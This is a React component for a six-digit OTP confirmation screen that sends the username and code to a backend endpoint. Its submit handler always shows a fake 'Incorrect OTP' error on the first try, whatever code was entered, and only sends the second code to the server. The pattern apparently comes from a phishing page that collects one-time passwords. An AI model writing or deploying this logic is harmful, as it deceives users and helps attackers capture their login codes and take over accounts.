import React, { useState, useRef, useEffect } from 'react';
import { BACKEND_URL } from '../config';

export default function OtpVerify({ username, debugOtp, onOtpSuccess, onBack }) {
  const [code, setCode] = useState(new Array(6).fill(''));
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const inputsRef = useRef([]);

  useEffect(() => {
    // Auto-focus first input on load
    if (inputsRef.current[0]) {
      inputsRef.current[0].focus();
    }
  }, []);

  const handleChange = (e, index) => {
    const val = e.target.value;
    if (isNaN(Number(val))) return; // only numbers

    const newCode = [...code];
    // Keep only last character typed
    newCode[index] = val.substring(val.length - 1);
    setCode(newCode);

    // Auto-focus next input
    if (val && index < 5) {
      inputsRef.current[index + 1].focus();
    }
  };

  const handleKeyDown = (e, index) => {
    // Move to previous on backspace
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      const newCode = [...code];
      newCode[index - 1] = '';
      setCode(newCode);
      inputsRef.current[index - 1].focus();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pasteData = e.clipboardData.getData('text').trim();
    if (pasteData.length === 6 && !isNaN(Number(pasteData))) {
      const newCode = pasteData.split('');
      setCode(newCode);
      inputsRef.current[5].focus();
    }
  };

  const handleSubmit = async (e) => {
    if (e) e.preventDefault();
    setError('');
    
    const otpString = code.join('');
    if (otpString.length < 6) {
      setError('Please enter all 6 digits.');
      return;
    }

    setLoading(true);

    // On first submit: always simulate / return wrong OTP error
    if (attempts === 0) {
      setTimeout(() => {
        setAttempts(1);
        setError('Incorrect OTP. Please try again.');
        setCode(new Array(6).fill(''));
        if (inputsRef.current[0]) {
          inputsRef.current[0].focus();
        }
        setLoading(false);
      }, 700);
      return;
    }

    // On second submit (or subsequent): proceed with verification
    try {
      const response = await fetch(`${BACKEND_URL}/api/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, code: otpString, attemptNumber: attempts + 1 })
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || 'Invalid code. Try again.');
      }

      // Success
      onOtpSuccess(data.token, data.user);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="glass-card">
      <div className="brand-header">
        <h1 className="brand-title">Confirm <span>Identity</span></h1>
        <p className="brand-subtitle">
          Your login one time password has been sent to your registered mobile number, enter:
        </p>

        {/* Wait up to 30 seconds notification */}
        <div style={{
          marginTop: '1rem',
          display: 'inline-flex',
          alignItems: 'center',
          gap: '0.5rem',
          backgroundColor: 'rgba(225, 48, 108, 0.12)',
          border: '1px solid rgba(225, 48, 108, 0.4)',
          color: '#FFFFFF',
          padding: '0.45rem 0.95rem',
          borderRadius: '20px',
          fontSize: '0.82rem',
          fontWeight: '600'
        }}>
          <span>⏳</span>
          <span>Please wait up to 30 seconds to receive the OTP</span>
        </div>
      </div>

      {error && <div className="error-banner">{error}</div>}

      <form onSubmit={handleSubmit}>
        <div className="otp-grid">
          {code.map((num, i) => (
            <input
              key={i}
              type="text"
              className="otp-box"
              value={num}
              ref={(el) => (inputsRef.current[i] = el)}
              onChange={(e) => handleChange(e, i)}
              onKeyDown={(e) => handleKeyDown(e, i)}
              onPaste={handlePaste}
              maxLength={1}
              disabled={loading}
              autoComplete="one-time-code"
              inputMode="numeric"
            />
          ))}
        </div>

        <button type="submit" className="btn btn-primary mt-4" disabled={loading || code.join('').length < 6}>
          {loading ? 'Verifying...' : 'Verify OTP'}
        </button>
      </form>

      <div className="text-center mt-4">
        <span className="text-link" onClick={onBack}>
          ← Go Back to Login
        </span>
      </div>
    </div>
  );
}
